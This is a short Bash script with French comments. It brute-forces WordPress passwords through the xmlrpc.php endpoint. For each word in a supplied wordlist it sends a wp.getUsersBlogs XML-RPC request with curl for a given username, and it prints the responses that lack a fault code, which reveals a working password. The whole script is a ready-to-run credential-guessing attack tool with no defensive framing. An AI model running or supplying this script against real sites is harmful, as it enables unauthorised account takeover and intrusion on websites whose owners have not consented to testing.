#!/bin/bash

# Variables initiales
URL=""
USERNAME=""
FILE=""

# Fonction d'aide pour l'utilisation du script
usage() {
    echo "Utilisation : $0 -u <nom_utilisateur> -w <fichier_de_mots> -U <url_xmlrpc>"
    echo "Exemple : $0 -u admin -w pass.txt -U http://example.com/xmlrpc.php"
    exit 1
}

# Analyse des arguments de la ligne de commande (-u pour username, -w pour wordfile, -U pour URL)
while getopts ":u:w:U:h" opt; do
    case ${opt} in
        u)
            USERNAME="$OPTARG"
            ;;
        w)
            FILE="$OPTARG"
            ;;
        U)
            URL="$OPTARG"
            ;;
        h)
            usage
            ;;
        \?)
            echo "Option invalide : -$OPTARG" >&2
            usage
            ;;
        :)
            echo "L'option -$OPTARG nécessite un argument." >&2
            usage
            ;;
    esac
done

# Vérification que toutes les options obligatoires ont bien été fournies
if [ -z "$USERNAME" ] || [ -z "$FILE" ] || [ -z "$URL" ]; then
    echo "Erreur : Les options -u, -w et -U sont toutes obligatoires."
    usage
fi

# Vérifier si le fichier de mots existe
if [ ! -f "$FILE" ]; then
    echo "Erreur : Le fichier '$FILE' est introuvable."
    exit 1
fi

# Parcourir chaque mot du fichier ligne par ligne
while IFS= read -r word || [ -n "$word" ]; do
    # Ignorer les lignes vides
    [[ -z "$word" ]] && continue

    # Exécuter la requête curl avec les paramètres dynamiques
    response=$(curl -s -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$USERNAME</value></param><param><value>$word</value></param></params></methodCall>" "$URL")

    echo "$response" | grep "<member><name>" | grep -iv "faultCode" | while read -r line; do
        echo "Mot : $word | Ligne : $line"
    done

done < "$FILE"
